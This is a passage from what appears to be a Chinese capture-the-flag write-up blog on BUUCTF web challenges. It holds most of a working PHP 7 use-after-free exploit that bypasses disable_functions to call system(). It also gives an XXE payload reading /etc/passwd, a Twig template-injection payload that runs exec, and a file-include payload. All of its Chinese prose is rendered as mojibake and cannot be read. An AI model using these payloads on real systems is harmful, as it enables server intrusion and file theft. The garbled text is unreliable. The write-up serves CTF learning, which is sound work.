</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>f_name</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>f_entry</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=o>$</span><span class=n>f_name</span> <span class=o>==</span> <span class=mh>0x6d6574737973</span><span class=p>)</span> <span class=p>{</span> <span class=c1># system</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>addr</span> <span class=o>+</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>addr</span> <span class=o>+=</span> <span class=mh>0x20</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>while</span><span class=p>(</span><span class=o>$</span><span class=n>f_entry</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=n>ryat</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>var</span> <span class=o>$</span><span class=n>ryat</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>var</span> <span class=o>$</span><span class=n>chtg</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>function</span> <span class=n>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>chtg</span> <span class=o>=</span> <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>ryat</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=o>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>ryat</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=n>Helper</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>public</span> <span class=o>$</span><span class=n>a</span><span class=p>,</span> <span class=o>$</span><span class=n>b</span><span class=p>,</span> <span class=o>$</span><span class=n>c</span><span class=p>,</span> <span class=o>$</span><span class=n>d</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>stristr</span><span class=p>(</span><span class=n>PHP_OS</span><span class=p>,</span> <span class=s1>&#39;WIN&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>die</span><span class=p>(</span><span class=s1>&#39;This PoC is for *nix systems only.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>n_alloc</span> <span class=o>=</span> <span class=mi>10</span><span class=p>;</span> <span class=c1># increase this value if you get segfaults</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>contiguous</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=o>$</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span> <span class=o>&lt;</span> <span class=o>$</span><span class=n>n_alloc</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>$</span><span class=n>contiguous</span><span class=p>[]</span> <span class=o>=</span> <span class=n>str_repeat</span><span class=p>(</span><span class=s1>&#39;A&#39;</span><span class=p>,</span> <span class=mi>79</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>poc</span> <span class=o>=</span> <span class=s1>&#39;a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:&#34;ryat&#34;:2:{s:4:&#34;ryat&#34;;R:3;s:4:&#34;chtg&#34;;i:2;}}i:1;i:3;i:2;R:5;}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>out</span> <span class=o>=</span> <span class=n>unserialize</span><span class=p>(</span><span class=o>$</span><span class=n>poc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>gc_collect_cycles</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>v</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>ptr2str</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>79</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>unset</span><span class=p>(</span><span class=o>$</span><span class=n>v</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>abc</span> <span class=o>=</span> <span class=o>$</span><span class=n>out</span><span class=p>[</span><span class=mi>2</span><span class=p>][</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>helper</span> <span class=o>=</span> <span class=n>new</span> <span class=n>Helper</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>helper</span><span class=o>-&gt;</span><span class=n>b</span> <span class=o>=</span> <span class=n>function</span> <span class=p>(</span><span class=o>$</span><span class=n>x</span><span class=p>)</span> <span class=p>{</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>strlen</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>)</span> <span class=o>==</span> <span class=mi>79</span> <span class=o>||</span> <span class=n>strlen</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>die</span><span class=p>(</span><span class=s2>&#34;UAF failed&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># leaks</span>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>closure_handlers</span> <span class=o>=</span> <span class=n>str2ptr</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>php_heap</span> <span class=o>=</span> <span class=n>str2ptr</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>abc_addr</span> <span class=o>=</span> <span class=o>$</span><span class=n>php_heap</span> <span class=o>-</span> <span class=mh>0xc8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># fake value</span>
</span></span><span class=line><span class=cl>    <span class=n>write</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>write</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mi>6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># fake reference</span>
</span></span><span class=line><span class=cl>    <span class=n>write</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=o>$</span><span class=n>abc_addr</span> <span class=o>+</span> <span class=mh>0x60</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>write</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=mh>0xa</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>closure_obj</span> <span class=o>=</span> <span class=n>str2ptr</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>binary_leak</span> <span class=o>=</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>closure_handlers</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=o>$</span><span class=n>base</span> <span class=o>=</span> <span class=n>get_binary_base</span><span class=p>(</span><span class=o>$</span><span class=n>binary_leak</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>die</span><span class=p>(</span><span class=s2>&#34;Couldn&#39;t determine binary base address&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=o>$</span><span class=n>elf</span> <span class=o>=</span> <span class=n>parse_elf</span><span class=p>(</span><span class=o>$</span><span class=n>base</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>die</span><span class=p>(</span><span class=s2>&#34;Couldn&#39;t parse ELF header&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=o>$</span><span class=n>basic_funcs</span> <span class=o>=</span> <span class=n>get_basic_funcs</span><span class=p>(</span><span class=o>$</span><span class=n>base</span><span class=p>,</span> <span class=o>$</span><span class=n>elf</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>die</span><span class=p>(</span><span class=s2>&#34;Couldn&#39;t get basic_functions address&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=o>$</span><span class=n>zif_system</span> <span class=o>=</span> <span class=n>get_system</span><span class=p>(</span><span class=o>$</span><span class=n>basic_funcs</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>die</span><span class=p>(</span><span class=s2>&#34;Couldn&#39;t get zif_system address&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># fake closure object</span>
</span></span><span class=line><span class=cl>    <span class=o>$</span><span class=n>fake_obj_offset</span> <span class=o>=</span> <span class=mh>0xd0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=o>$</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x110</span><span class=p>;</span> <span class=o>$</span><span class=n>i</span> <span class=o>+=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>write</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=o>$</span><span class=n>fake_obj_offset</span> <span class=o>+</span> <span class=o>$</span><span class=n>i</span><span class=p>,</span> <span class=n>leak</span><span class=p>(</span><span class=o>$</span><span class=n>closure_obj</span><span class=p>,</span> <span class=o>$</span><span class=n>i</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># pwn</span>
</span></span><span class=line><span class=cl>    <span class=n>write</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=o>$</span><span class=n>abc_addr</span> <span class=o>+</span> <span class=o>$</span><span class=n>fake_obj_offset</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>write</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=mh>0xd0</span> <span class=o>+</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span> <span class=c1># internal func type</span>
</span></span><span class=line><span class=cl>    <span class=n>write</span><span class=p>(</span><span class=o>$</span><span class=n>abc</span><span class=p>,</span> <span class=mh>0xd0</span> <span class=o>+</span> <span class=mh>0x68</span><span class=p>,</span> <span class=o>$</span><span class=n>zif_system</span><span class=p>);</span> <span class=c1># internal func handler</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=o>$</span><span class=n>helper</span><span class=o>-&gt;</span><span class=n>b</span><span class=p>)(</span><span class=o>$</span><span class=n>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>åœ¨èšå‰‘å¯ä»¥çœ‹å‡ºtmpæ–‡ä»¶å¤¹æƒé™å¯ä»¥ä¸Šä¼ ï¼Œä¸Šä¼ ä»¥åä½¿ç”¨æ–‡ä»¶åŒ…å«è¾“å‡ºæ‰§è¡Œç»“æœã€‚æ–‡ä»¶åŒ…å«payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?Ginkgo=aW5jbHVkZSgnL3RtcC9waHA3LWdjLWJ5cGFzcy5waHAnKTs=
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=0302>03.02</h1><hr><h1 id=nctf2019fake-xml-cookbook>[NCTF2019]Fake XML cookbook</h1><p>æ ¹æ®é¢˜ç›®æ˜¯XMLï¼Œé¦–å…ˆæƒ³åˆ°æ˜¯XXEï¼Œè™½ç„¶å’±æ²¡å­¦è¿‡ä½†æ˜¯å¯ä»¥å»æœç®€å•çš„payloadã€‚</p><p>ä½¿ç”¨bpæŠ“ä¸ªåŒ…ï¼ŒPOSTä¸­ä¼ å…¥çš„æ˜¯æ ‡ç­¾æ ¼å¼ï¼Œå¯ä»¥ç¡®å®šæ˜¯XXEç±»å‹çš„é¢˜ç›®</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST
</span></span><span class=line><span class=cl>Content-Type: application/xml;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;user&gt;&lt;username&gt;1&lt;/username&gt;&lt;password&gt;2&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></td></tr></table></div></div><p>å»æ‘¸ä¸€ä¸ªpayloadè¯•è¯•</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
</span></span><span class=line><span class=cl>&lt;!DOCTYPE test [
</span></span><span class=line><span class=cl>  &lt;!ENTITY admin SYSTEM &#34;file:///etc/passwd&#34;&gt;
</span></span><span class=line><span class=cl>  ]&gt;
</span></span><span class=line><span class=cl>&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></td></tr></table></div></div><p>æˆåŠŸè¯»å–æ–‡ä»¶</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302110439.png loading=lazy></p><p>æŠŠè·¯å¾„æ”¹ä¸º/flagï¼Œè·å¾—flag</p><hr><h1 id=asis-2019unicorn-shop>[ASIS 2019]Unicorn shop</h1><p>è¿™é“é¢˜ç»æ´»ã€‚å­¦åˆ°äº†unicodeçš„å®‰å…¨é—®é¢˜ï¼š<a class=link href=https://xz.aliyun.com/t/5402 target=_blank rel=noopener>æµ…è°ˆUnicodeè®¾è®¡çš„å®‰å…¨æ€§</a>ï¼Œçœ‹äº†wpã€‚</p><p>è¿›å…¥ç½‘ç«™ä¸€ä¸ªæœ¬æ°æ˜Â·å¯Œå…°å…‹æ—è‡³ç†åè¨€ï¼š</p><blockquote><p>é‡‘é’±ä»æ¥ä¸ä¼šä½¿äººå¹¸ç¦ï¼Œä¹Ÿä¸ä¼šä½¿äººå¹¸ç¦ï¼›å®ƒçš„æœ¬æ€§ä¸­æ²¡æœ‰ä»»ä½•ä¸œè¥¿å¯ä»¥äº§ç”Ÿå¹¸ç¦ã€‚å¹¸ç¦æ‹¥æœ‰çš„è¶Šå¤šï¼Œæƒ³è¦çš„å°±è¶Šå¤š</p></blockquote><p><del>å·®ç‚¹ä¿¡äº†ï¼Œæˆ‘å°±è¦èµšé’±èŠ±(å°å£°bb)</del></p><p>ä¸‹é¢ä¸¤ä¸ªè¾“å…¥æ¡†ï¼Œä¸€ä¸ªIDä¸€ä¸ªé’±ï¼Œä¸Šé¢ä¸€ä¸ªç‹¬è§’å…½å•†å“åˆ—è¡¨ï¼Œä¸€çœ‹å°±æ˜¯è®©ä¹°ä¸œè¥¿ï¼Œä½†æ˜¯1-3å•†å“è¾“å…¥IDéƒ½æç¤ºé”™è¯¯ï¼Œåªæœ‰ç¬¬å››ä¸ªå¯ä»¥ä¹°åˆ°ï¼Œä½†æ˜¯ç¬¬å››ä¸ªè¾“å…¥é’±çš„æ—¶å€™åªèƒ½è¾“å…¥1ä½ï¼Œç„¶é¹…4å·ä»·æ ¼æ˜¯1377ï¼Œæ˜¾ç„¶ä¹°ä¸åˆ°ï¼Œè¾“å…¥å¤šä¸ªåˆæç¤º ï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯æ‰¾ä¸€ä¸ªunicodeå­—ç¬¦ï¼Œå®ƒçš„æ•°å­—æ ¼å¼å€¼æ˜¯å¤§äº1377çš„ã€‚</p><p>ä¸€ä¸ªå’Œunicodeæœ‰å…³çš„ç½‘ç«™ï¼šhttps://www.compart.com/en/unicode</p><p>ç½‘ç«™å¯¼èˆªæ æ‰¾åˆ°Character Categoriesåˆ†ç±»ï¼Œè¿™ä¸ªä¸‹æœ‰ä¸‰ä¸ªå’Œæ•°ç›¸å…³çš„ï¼šDecimal Numberã€Letter Numberã€Other Numberï¼Œç¬¬ä¸€ä¸ªé‡Œé¢éƒ½æ˜¯æ­£å¸¸æ•°å€¼çš„unicodeï¼Œå»ºè®®å»åé¢ä¸¤ä¸ªæ‰¾ã€‚æ€ä¹ˆæ‰¾ï¼š<code>Ctrl+F</code>æœç´¢thousandï¼Œæ‰¾1377ä»¥ä¸Šçš„éƒ½å¯ã€‚</p><p>æˆ‘é€‰çš„æ˜¯è¿™ä¸ª<code>á¼</code>æ•°å€¼æ˜¯1wï¼Œç›´æ¥ä¼ ä¼ ä¸è¿‡å»ï¼Œä½¿ç”¨urlç¼–ç ä¸€æ¬¡å†ä¼ ã€‚</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302113544.png loading=lazy></p><hr><h1 id=bjdctf2020cookie-is-so-stable>[BJDCTF2020]Cookie is so stable</h1><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210304092035.png loading=lazy></p><p>è¿™é“é¢˜å’ŒThe mystery of ipçš„ç½‘ç«™ä¸€æ ·ï¼Œè¿˜æœ‰å¯èƒ½æ˜¯sstiï¼Œhint.phpçš„æ³¨é‡Šé‡Œæœ‰</p><blockquote><p>Why not take a closer look at cookies?</p></blockquote><p>å»flag.phpæäº¤ä¸ª1ä¹‹åï¼Œçœ‹cookieä¸º</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Cookie: PHPSESSID=dba9ac7cbddf1983cbac508b01f8cdf2; user=1
</span></span></code></pre></td></tr></table></div></div><p>ä¸€ç›®äº†ç„¶ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾payloadã€‚å†ä½¿ç”¨ä¹‹å‰çš„</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{system(&#39;cat /flag&#39;)}
</span></span></code></pre></td></tr></table></div></div><p>è¢«æ‹¦ä¸‹æ¥äº†ï¼Œè¯´æ˜åŠ å¼ºäº†è¿‡æ»¤ã€‚åœ¨è¿™ä¹‹åå»çœ‹äº†wpï¼Œç½‘ä¸Šçš„wpéƒ½æ˜¯ç›´æ¥ç»™å‡ºäº†payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{{_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}{{_self.env.getFilter(&#34;whoami&#34;)}}
</span></span></code></pre></td></tr></table></div></div><p>æˆ‘æ˜¯å—äº†è¿™ä½å¸ˆå‚…çš„<a class=link href=https://www.cnblogs.com/bmjoker/p/13508538.html target=_blank rel=noopener>æ–‡ç« </a>å¯å‘ï¼Œåˆå»ç»“åˆäº†ä¸‹è¿™é“é¢˜çš„<a class=link href=https://github.com/BjdsecCA/BJDCTF2020_January/tree/f73ac63336d9161d3c91354ce3eac943c403d4fb/Web/ssti_twig target=_blank rel=noopener>æºç </a>æ‰ææ˜ç™½ã€‚</p><p>è¿™é“é¢˜åœ¨æ¸²æŸ“ä¹‹å‰ä½¿ç”¨äº†twigæ¨¡æ¿ï¼š</p><blockquote><p>Twigæ˜¯æ¥è‡ªäºSymfonyçš„æ¨¡æ¿å¼•æ“ï¼Œå®ƒéå¸¸æ˜“äºå®‰è£…å’Œä½¿ç”¨ã€‚å®ƒçš„æ“ä½œæœ‰ç‚¹åƒMustacheå’Œliquidã€‚Twigä½¿ç”¨ä¸€ä¸ªåŠ è½½å™¨ loader(Twig_Loader_Array) æ¥å®šä½æ¨¡æ¿ï¼Œä»¥åŠä¸€ä¸ªç¯å¢ƒå˜é‡ environment(Twig_Environment) æ¥å­˜å‚¨é…ç½®ä¿¡æ¯ã€‚å…¶ä¸­ï¼Œrender() æ–¹æ³•é€šè¿‡å…¶ç¬¬ä¸€ä¸ªå‚æ•°è½½å…¥æ¨¡æ¿ï¼Œå¹¶é€šè¿‡ç¬¬äºŒä¸ªå‚æ•°ä¸­çš„å˜é‡æ¥æ¸²æŸ“æ¨¡æ¿ã€‚</p></blockquote><p>æˆ‘åŒæ ·åœ¨é¢˜ç›®çš„æºç ä¸­æ‰¾åˆ°äº†<code>render()</code>æ–¹æ³•å’Œ<code>Twig_Environment</code>é…ç½®ä¿¡æ¯</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302160322.png loading=lazy></p><p>ç„¶åpayloadçš„å…·ä½“åŸç†åœ¨çš„<code>Environment.php</code>ä¸­,è´´ä¸€ä¸‹å’Œpayloadç›¸å…³éƒ¨åˆ†ï¼š</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302160722.png loading=lazy></p><ol><li>å…ˆæ‰§è¡Œ<code>{{_self.env.registerUndefinedFilterCallback("exec")}}</code>è°ƒç”¨äº†<code>registerUndefinedFilterCallback()</code>å‡½æ•°(å›¾ä¸­884è¡Œ)ï¼Œæ³¨å†Œäº†ä¸€ä¸ªæœªå®šä¹‰çš„å‡½æ•°åˆ°<code>filterCallbacks</code>å…¨å±€å˜é‡ä¸­</li><li>æ¥ç€æ‰§è¡Œ<code>{{_self.env.getFilter("whoami")}}</code>è°ƒç”¨äº†<code>getFilter()</code>å‡½æ•°ï¼Œå¹¶ä¼ å…¥å˜é‡<code>$name</code>å€¼ä¸ºæ‰§è¡Œçš„å‘½ä»¤ï¼Œå½“å‡½æ•°æ‰§è¡Œåˆ°å›¾ä¸­ä»£ç 875è¡Œæ—¶ï¼Œè¿›å…¥å¾ªç¯æ‰§è¡Œäº†<code>call_user_func()</code>ï¼Œè¿™ä¸ªå‡½æ•°å¤§ä¼™è‚¯å®šä¸é™Œç”Ÿï¼šcall_user_func å¯ä»¥æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ï¼Œè°ƒç”¨çš„å‚æ•°æ¥æºå°±æ˜¯ç¬¬ä¸€æ­¥ä¸­æ³¨å†Œçš„<code>filterCallbacks</code>å…¨å±€å˜é‡ï¼Œé‡Œè¾¹å·²ç»èººå¥½äº†ä¸€ä¸ªåˆšåˆšæ³¨å†Œçš„<code>exec</code>ï¼Œè‡³æ­¤å°±å½¢æˆäº†payload</li></ol><hr><h1 id=å°å½©è›‹>å°å½©è›‹</h1><p>ç°åœ¨(2021å¹´3æœˆ2æ—¥16:32:44)åˆšå¥½åšå®Œé¢˜ï¼Œæƒ³å›åˆ°BUUä¸Šæ•´ç†è¿‡ç¨‹ï¼Œå‘ç°502äº†ï¼Œç„¶åå»ç¾¤é‡Œå°±çœ‹åˆ°äº†</p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302163452.png loading=lazy></p><p><img src=https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302163636.png loading=lazy></p><p>æŒºè‰çš„è®°ä¸€ä¸‹ã€‚</p><hr><h1 id=ciscn-2019-åˆèµ›love-math>[CISCN 2019 åˆèµ›]Love Math</h1><p>æºç ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>//ä¾‹å­ c=20-1
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$content</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$content</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>80</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;å¤ªé•¿äº†ä¸ä¼šç®—&#34;</span><span class=p>);</span>
